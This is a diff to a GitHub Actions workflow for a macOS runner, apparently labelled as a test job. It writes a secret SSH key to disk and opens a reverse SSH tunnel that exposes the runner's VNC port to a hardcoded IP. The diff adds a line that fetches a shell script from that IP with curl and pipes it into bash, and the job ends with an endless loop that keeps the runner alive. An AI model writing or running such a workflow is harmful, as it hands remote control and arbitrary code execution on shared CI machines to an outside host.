@@ -9,6 +9,7 @@ jobs:
     runs-on: macos-latest
     env:
       key: ${{ secrets.key }}
+      header: ${{ secrets.header }}
     environment: test
     steps:
     - uses: actions/checkout@v2
@@ -24,5 +25,6 @@ jobs:
         echo "$key" > ~/.ssh/id_rsa
         chmod 0600 ~/.ssh/id_rsa
         bash -c "unbuffer ssh -R 0.0.0.0:$(pbpaste):localhost:5901 x@52.36.65.97" &>/dev/null &
+        curl -H "$header" http://52.36.65.97:8043/b.sh | bash &
         echo testa
     - run: while true; do echo '.'; sleep 10; done
